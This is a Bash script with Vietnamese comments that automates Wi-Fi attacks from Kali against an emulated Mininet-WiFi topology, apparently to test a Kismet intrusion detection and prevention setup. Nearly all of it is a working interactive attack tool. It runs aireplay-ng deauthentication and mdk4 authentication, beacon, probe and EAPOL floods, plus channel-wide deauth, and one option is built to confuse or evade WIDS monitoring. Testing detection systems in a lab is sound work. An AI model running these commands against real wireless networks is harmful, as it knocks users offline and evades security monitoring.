#!/bin/bash
# kali_wids_attacks.sh
# Script tự động hóa các công cụ thực tế trên Kali (aireplay-ng, mdk4)
# để tấn công vào topo Mininet-WiFi nhằm kiểm thử Kismet WIDS.
#
# Topology tham chiếu: dense_wifi_topology.py (5 zone × dual-band + 4 rogue)
#   - Mininet chiếm wlan1–wlan24 (24 nodes)
#   - wlan30 = WIPS deauth (kismet_wips_daemon.py)
#   - wlan31 = Kismet monitor
#   - wlan25–wlan29, wlan32 = free host interfaces
#   → Dùng wlan29 làm interface tấn công

# ═══════════════════════════════════════════════════════════════════
# ANSI Color Codes
# ═══════════════════════════════════════════════════════════════════
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ═══════════════════════════════════════════════════════════════════
# CẤU HÌNH
# ═══════════════════════════════════════════════════════════════════
ATTACK_IFACE="wlan29"    # Interface tấn công (host giữ, không bị Mininet chiếm)

# ── AP HỢP LỆ (WPA2) ─────────────────────────────────────────────
# Zone A / Tầng 1
AP_A1_BSSID="02:00:00:00:A1:00"    # Company-WiFi       2.4G CH1
AP_A1_CH=1
AP_A2_BSSID="02:00:00:00:A1:50"    # Company-WiFi-5G    5G   CH36
AP_A2_CH=36

# Zone B / Tầng 2
AP_B1_BSSID="02:00:00:00:A2:00"    # Company-WiFi       2.4G CH6
AP_B1_CH=6
AP_B2_BSSID="02:00:00:00:A2:50"    # Company-WiFi-5G    5G   CH40
AP_B2_CH=40

# Zone C / Tầng 3
AP_C1_BSSID="02:00:00:00:A3:00"    # Company-WiFi       2.4G CH11
AP_C1_CH=11
AP_C2_BSSID="02:00:00:00:A3:50"    # Company-WiFi-5G    5G   CH44
AP_C2_CH=44

# Zone D / Guest
AP_D1_BSSID="02:00:00:00:A4:00"    # Company-Guest      2.4G CH6
AP_D1_CH=6
AP_D2_BSSID="02:00:00:00:A4:50"    # Company-Guest-5G   5G   CH149
AP_D2_CH=149

# ── ROGUE AP (Evil Twin / Spoof — không mật khẩu) ─────────────────
ROGUE_2G_BSSID="02:00:00:00:FF:00"   # Evil Twin Company-WiFi     2.4G CH11
ROGUE_2G_CH=11
ROGUE_5G_BSSID="02:00:00:00:FE:50"   # Evil Twin Company-WiFi-5G  5G   CH36
ROGUE_5G_CH=36
ROGUE_GUEST_2G_BSSID="02:00:00:00:FD:00"  # Guest Spoof 2.4G   CH1
ROGUE_GUEST_2G_CH=1
ROGUE_GUEST_5G_BSSID="02:00:00:00:FD:50"  # Guest Spoof 5G     CH153
ROGUE_GUEST_5G_CH=153

# ═══════════════════════════════════════════════════════════════════
# KIỂM TRA TIỀN ĐIỀU KIỆN
# ═══════════════════════════════════════════════════════════════════
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Vui lòng chạy script bằng quyền root (sudo)!${NC}"
  exit 1
fi

for tool in aireplay-ng mdk4 iw ip; do
  if ! command -v "$tool" &>/dev/null; then
    echo -e "${RED}[!] Công cụ '$tool' chưa được cài đặt.${NC}"
    echo -e "    Gợi ý: ${CYAN}sudo apt install aircrack-ng mdk4 iw iproute2${NC}"
    exit 1
  fi
done

# Kiểm tra interface tấn công tồn tại
if ! ip link show "$ATTACK_IFACE" &>/dev/null; then
  echo -e "${RED}[!] Interface $ATTACK_IFACE không tồn tại!${NC}"
  echo -e "    Kiểm tra: mac80211_hwsim đã nạp đủ radios và Mininet đang chạy?"
  echo -e "    Thử: ${CYAN}ip link show | grep wlan${NC}"
  exit 1
fi

# ═══════════════════════════════════════════════════════════════════
# HÀM TIỆN ÍCH
# ═══════════════════════════════════════════════════════════════════

# Chuyển interface sang monitor mode ở kênh chỉ định
setup_monitor() {
  local iface=$1
  local channel=$2
  echo -e "${BLUE}[*] Cấu hình $iface → Monitor mode (CH$channel)...${NC}"
  ip link set "$iface" down 2>/dev/null
  iw dev "$iface" set type monitor 2>/dev/null
  ip link set "$iface" up 2>/dev/null
  iw dev "$iface" set channel "$channel" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] $iface sẵn sàng ở Monitor mode — Kênh $channel${NC}"
    return 0
  else
    echo -e "${RED}[!] Không thể set kênh $channel trên $iface${NC}"
    return 1
  fi
}

# Dọn dẹp khi thoát (trap)
cleanup_exit() {
  echo -e "\n${YELLOW}[*] Đang dọn dẹp $ATTACK_IFACE...${NC}"
  killall -9 aireplay-ng mdk4 2>/dev/null
  ip link set "$ATTACK_IFACE" down 2>/dev/null
  iw dev "$ATTACK_IFACE" set type managed 2>/dev/null
  ip link set "$ATTACK_IFACE" up 2>/dev/null
  echo -e "${GREEN}[+] Đã trả $ATTACK_IFACE về managed mode. Thoát.${NC}"
}
trap cleanup_exit EXIT

# ═══════════════════════════════════════════════════════════════════
# CHỌN MỤC TIÊU TẤN CÔNG
# ═══════════════════════════════════════════════════════════════════
select_target() {
  echo ""
  echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
  echo -e "${WHITE}   CHỌN MỤC TIÊU TẤN CÔNG (AP trong topology)${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
  echo -e "  ${WHITE}── AP HỢP LỆ (WPA2) ──${NC}"
  echo -e "  ${GREEN} 1)${NC} ap1  Company-WiFi      2.4G CH1    ${BLUE}$AP_A1_BSSID${NC}"
  echo -e "  ${GREEN} 2)${NC} ap2  Company-WiFi-5G   5G   CH36   ${BLUE}$AP_A2_BSSID${NC}"
  echo -e "  ${GREEN} 3)${NC} ap3  Company-WiFi      2.4G CH6    ${BLUE}$AP_B1_BSSID${NC}"
  echo -e "  ${GREEN} 4)${NC} ap4  Company-WiFi-5G   5G   CH40   ${BLUE}$AP_B2_BSSID${NC}"
  echo -e "  ${GREEN} 5)${NC} ap5  Company-WiFi      2.4G CH11   ${BLUE}$AP_C1_BSSID${NC}"
  echo -e "  ${GREEN} 6)${NC} ap6  Company-WiFi-5G   5G   CH44   ${BLUE}$AP_C2_BSSID${NC}"
  echo -e "  ${GREEN} 7)${NC} ap7  Company-Guest     2.4G CH6    ${BLUE}$AP_D1_BSSID${NC}"
  echo -e "  ${GREEN} 8)${NC} ap8  Company-Guest-5G  5G   CH149  ${BLUE}$AP_D2_BSSID${NC}"
  echo -e "  ${WHITE}── ROGUE AP (Evil Twin / Spoof) ──${NC}"
  echo -e "  ${RED} 9)${NC} ap9  Company-WiFi (Rogue)     2.4G CH11   ${MAGENTA}$ROGUE_2G_BSSID${NC}"
  echo -e "  ${RED}10)${NC} ap10 Company-WiFi-5G (Rogue)  5G   CH36   ${MAGENTA}$ROGUE_5G_BSSID${NC}"
  echo -e "  ${RED}11)${NC} ap11 Company-Guest (Spoof)    2.4G CH1    ${MAGENTA}$ROGUE_GUEST_2G_BSSID${NC}"
  echo -e "  ${RED}12)${NC} ap12 Company-Guest-5G (Spoof) 5G   CH153  ${MAGENTA}$ROGUE_GUEST_5G_BSSID${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
  echo -e -n "${WHITE}Chọn mục tiêu [1-12]: ${NC}"
  read target_choice

  case $target_choice in
     1) TARGET_BSSID="$AP_A1_BSSID"; TARGET_CH=$AP_A1_CH; TARGET_NAME="ap1 Company-WiFi 2.4G" ;;
     2) TARGET_BSSID="$AP_A2_BSSID"; TARGET_CH=$AP_A2_CH; TARGET_NAME="ap2 Company-WiFi-5G" ;;
     3) TARGET_BSSID="$AP_B1_BSSID"; TARGET_CH=$AP_B1_CH; TARGET_NAME="ap3 Company-WiFi 2.4G" ;;
     4) TARGET_BSSID="$AP_B2_BSSID"; TARGET_CH=$AP_B2_CH; TARGET_NAME="ap4 Company-WiFi-5G" ;;
     5) TARGET_BSSID="$AP_C1_BSSID"; TARGET_CH=$AP_C1_CH; TARGET_NAME="ap5 Company-WiFi 2.4G" ;;
     6) TARGET_BSSID="$AP_C2_BSSID"; TARGET_CH=$AP_C2_CH; TARGET_NAME="ap6 Company-WiFi-5G" ;;
     7) TARGET_BSSID="$AP_D1_BSSID"; TARGET_CH=$AP_D1_CH; TARGET_NAME="ap7 Company-Guest 2.4G" ;;
     8) TARGET_BSSID="$AP_D2_BSSID"; TARGET_CH=$AP_D2_CH; TARGET_NAME="ap8 Company-Guest-5G" ;;
     9) TARGET_BSSID="$ROGUE_2G_BSSID"; TARGET_CH=$ROGUE_2G_CH; TARGET_NAME="ap9 Rogue WiFi 2.4G" ;;
    10) TARGET_BSSID="$ROGUE_5G_BSSID"; TARGET_CH=$ROGUE_5G_CH; TARGET_NAME="ap10 Rogue WiFi 5G" ;;
    11) TARGET_BSSID="$ROGUE_GUEST_2G_BSSID"; TARGET_CH=$ROGUE_GUEST_2G_CH; TARGET_NAME="ap11 Rogue Guest 2.4G" ;;
    12) TARGET_BSSID="$ROGUE_GUEST_5G_BSSID"; TARGET_CH=$ROGUE_GUEST_5G_CH; TARGET_NAME="ap12 Rogue Guest 5G" ;;
     *)
       echo -e "${RED}[!] Lựa chọn không hợp lệ!${NC}"
       return 1
       ;;
  esac

  echo -e "${GREEN}[+] Đã chọn: ${WHITE}$TARGET_NAME${NC} — BSSID: ${CYAN}$TARGET_BSSID${NC} (CH$TARGET_CH)"
  setup_monitor "$ATTACK_IFACE" "$TARGET_CH"
  return 0
}

# Chọn SSID cho các kiểu tấn công cần SSID
select_ssid() {
  echo ""
  echo -e "${WHITE}Chọn SSID mục tiêu:${NC}"
  echo -e "  ${GREEN}1)${NC} Company-WiFi"
  echo -e "  ${GREEN}2)${NC} Company-WiFi-5G"
  echo -e "  ${GREEN}3)${NC} Company-Guest"
  echo -e "  ${GREEN}4)${NC} Company-Guest-5G"
  echo -e "  ${GREEN}5)${NC} Nhập SSID tùy chỉnh"
  echo -e -n "${WHITE}Lựa chọn [1-5]: ${NC}"
  read ssid_choice
  case $ssid_choice in
    1) TARGET_SSID="Company-WiFi" ;;
    2) TARGET_SSID="Company-WiFi-5G" ;;
    3) TARGET_SSID="Company-Guest" ;;
    4) TARGET_SSID="Company-Guest-5G" ;;
    5)
      echo -e -n "${WHITE}Nhập SSID: ${NC}"
      read TARGET_SSID
      ;;
    *) TARGET_SSID="Company-WiFi" ;;
  esac
  echo -e "${GREEN}[+] SSID mục tiêu: ${CYAN}$TARGET_SSID${NC}"
}

# Chọn kênh cho các kiểu broadcast (không cần chọn AP cụ thể)
select_channel() {
  echo ""
  echo -e "${WHITE}Chọn kênh tấn công:${NC}"
  echo -e "  ${WHITE}── 2.4 GHz ──${NC}"
  echo -e "  ${GREEN}1)${NC}  CH 1   (ap1, ap11 rogue)"
  echo -e "  ${GREEN}2)${NC}  CH 6   (ap3, ap7)"
  echo -e "  ${GREEN}3)${NC}  CH 11  (ap5, ap9 rogue)"
  echo -e "  ${WHITE}── 5 GHz ──${NC}"
  echo -e "  ${GREEN}4)${NC}  CH 36  (ap2, ap10 rogue)"
  echo -e "  ${GREEN}5)${NC}  CH 40  (ap4)"
  echo -e "  ${GREEN}6)${NC}  CH 44  (ap6)"
  echo -e "  ${GREEN}7)${NC}  CH 149 (ap8)"
  echo -e "  ${GREEN}8)${NC}  CH 153 (ap12 rogue)"
  echo -e -n "${WHITE}Lựa chọn [1-8]: ${NC}"
  read ch_choice
  case $ch_choice in
    1) BROADCAST_CH=1 ;;
    2) BROADCAST_CH=6 ;;
    3) BROADCAST_CH=11 ;;
    4) BROADCAST_CH=36 ;;
    5) BROADCAST_CH=40 ;;
    6) BROADCAST_CH=44 ;;
    7) BROADCAST_CH=149 ;;
    8) BROADCAST_CH=153 ;;
    *) BROADCAST_CH=11 ;;
  esac
  echo -e "${GREEN}[+] Kênh tấn công: ${CYAN}CH $BROADCAST_CH${NC}"
  setup_monitor "$ATTACK_IFACE" "$BROADCAST_CH"
}

# ═══════════════════════════════════════════════════════════════════
# MENU CHÍNH — VÒNG LẶP
# ═══════════════════════════════════════════════════════════════════
while true; do
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "${MAGENTA}   KỊCH BẢN TẤN CÔNG THỰC TẾ TRÊN KALI (AIRCRACK-NG / MDK4) ${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "  Interface tấn công : ${GREEN}$ATTACK_IFACE${NC}"
  echo -e "  Kismet monitor     : ${GREEN}wlan31${NC}"
  echo -e "  WIPS deauth        : ${GREEN}wlan30${NC}"
  echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
  echo -e "  ${WHITE}1)${NC} Deauthentication Attack ${YELLOW}(aireplay-ng)${NC}"
  echo -e "     └─ Ngắt kết nối client khỏi một AP mục tiêu"
  echo -e "  ${WHITE}2)${NC} Authentication Flood DoS ${YELLOW}(mdk4 -a)${NC}"
  echo -e "     └─ Gửi hàng loạt yêu cầu xác thực giả mạo vào AP"
  echo -e "  ${WHITE}3)${NC} Beacon Flood ${YELLOW}(mdk4 -b)${NC}"
  echo -e "     └─ Tạo hàng ngàn sóng Wi-Fi giả mạo (Fake APs)"
  echo -e "  ${WHITE}4)${NC} Amok Mode Deauth ${YELLOW}(mdk4 -d)${NC}"
  echo -e "     └─ Ngắt kết nối TẤT CẢ thiết bị trên một kênh"
  echo -e "  ${WHITE}5)${NC} Probe Request Flood ${YELLOW}(mdk4 -p)${NC}"
  echo -e "     └─ Gửi bão Probe Request dò tìm SSID"
  echo -e "  ${WHITE}6)${NC} EAPOL Start Flood ${YELLOW}(mdk4 -e)${NC}"
  echo -e "     └─ Tấn công quá tải WPA/WPA2-Enterprise"
  echo -e "  ${WHITE}7)${NC} WIDS/WIPS Confusion ${YELLOW}(mdk4 -w)${NC}"
  echo -e "     └─ Gửi gói tin dị thường qua mặt/kiểm tra WIDS"
  echo -e "  ${WHITE}0)${NC} Thoát"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
  echo -e -n "${WHITE}Lựa chọn của bạn [0-7]: ${NC}"
  read choice

  case $choice in
    1)
      echo -e "\n${MAGENTA}━━━ DEAUTHENTICATION ATTACK (aireplay-ng) ━━━${NC}"
      select_target || continue
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: aireplay-ng -0 0 -a $TARGET_BSSID -D --ignore-negative-one $ATTACK_IFACE${NC}"
      # -0 = deauth, 0 = gửi liên tục, -a = BSSID mục tiêu, -D = bỏ qua tìm AP bằng beacon, --ignore-negative-one = sửa lỗi kênh ảo
      aireplay-ng -0 0 -a "$TARGET_BSSID" -D --ignore-negative-one "$ATTACK_IFACE"
      echo -e "${GREEN}[+] Đã dừng Deauth Attack.${NC}"
      ;;

    2)
      echo -e "\n${MAGENTA}━━━ AUTHENTICATION FLOOD DoS (mdk4 -a) ━━━${NC}"
      select_target || continue
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE a -a $TARGET_BSSID -m${NC}"
      # Module 'a' = Auth DoS, -a = target BSSID, -m = dùng MAC hợp lệ
      mdk4 "$ATTACK_IFACE" a -a "$TARGET_BSSID" -m
      echo -e "${GREEN}[+] Đã dừng Auth Flood.${NC}"
      ;;

    3)
      echo -e "\n${MAGENTA}━━━ BEACON FLOOD (mdk4 -b) ━━━${NC}"
      select_channel
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE b -c $BROADCAST_CH${NC}"
      # Module 'b' = Beacon Flood, -c = kênh
      mdk4 "$ATTACK_IFACE" b -c "$BROADCAST_CH"
      echo -e "${GREEN}[+] Đã dừng Beacon Flood.${NC}"
      ;;

    4)
      echo -e "\n${MAGENTA}━━━ AMOK MODE DEAUTH (mdk4 -d) ━━━${NC}"
      select_channel
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE d -c $BROADCAST_CH${NC}"
      # Module 'd' = Amok Deauth, -c = kênh
      mdk4 "$ATTACK_IFACE" d -c "$BROADCAST_CH"
      echo -e "${GREEN}[+] Đã dừng Amok Deauth.${NC}"
      ;;

    5)
      echo -e "\n${MAGENTA}━━━ PROBE REQUEST FLOOD (mdk4 -p) ━━━${NC}"
      select_ssid
      select_channel
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE p -e \"$TARGET_SSID\"${NC}"
      # Module 'p' = Probe Request Flood, -e = target SSID
      mdk4 "$ATTACK_IFACE" p -e "$TARGET_SSID"
      echo -e "${GREEN}[+] Đã dừng Probe Flood.${NC}"
      ;;

    6)
      echo -e "\n${MAGENTA}━━━ EAPOL START FLOOD (mdk4 -e) ━━━${NC}"
      select_target || continue
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE e -t $TARGET_BSSID${NC}"
      # Module 'e' = EAPOL Start Flood, -t = target BSSID
      mdk4 "$ATTACK_IFACE" e -t "$TARGET_BSSID"
      echo -e "${GREEN}[+] Đã dừng EAPOL Flood.${NC}"
      ;;

    7)
      echo -e "\n${MAGENTA}━━━ WIDS/WIPS CONFUSION (mdk4 -w) ━━━${NC}"
      select_ssid
      select_channel
      echo -e "${RED}[!] Nhấn Ctrl+C để dừng tấn công (quay lại menu).${NC}"
      echo -e "${YELLOW}[*] Lệnh: mdk4 $ATTACK_IFACE w -e \"$TARGET_SSID\" -c $BROADCAST_CH${NC}"
      # Module 'w' = WIDS Confusion, -e = SSID, -c = kênh
      mdk4 "$ATTACK_IFACE" w -e "$TARGET_SSID" -c "$BROADCAST_CH"
      echo -e "${GREEN}[+] Đã dừng WIDS Confusion.${NC}"
      ;;

    0)
      echo -e "${GREEN}Thoát. Chúc bạn kiểm thử thành công!${NC}"
      exit 0
      ;;

    *)
      echo -e "${RED}[!] Lựa chọn không hợp lệ! Vui lòng chọn 0-7.${NC}"
      ;;
  esac

  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
  echo -e "=> Kiểm tra kết quả tại:"
  echo -e "   • Kismet Web UI : ${CYAN}http://localhost:2501${NC} (monitor trên ${GREEN}wlan31${NC})"
  echo -e "   • WIPS Daemon   : ${CYAN}tail -f /var/log/kismet-wips/kismet_wips_daemon.log${NC}"
  echo -e "   • WIPS Alerts   : ${CYAN}tail -f /var/log/kismet-wips/wips-alerts.json${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
done
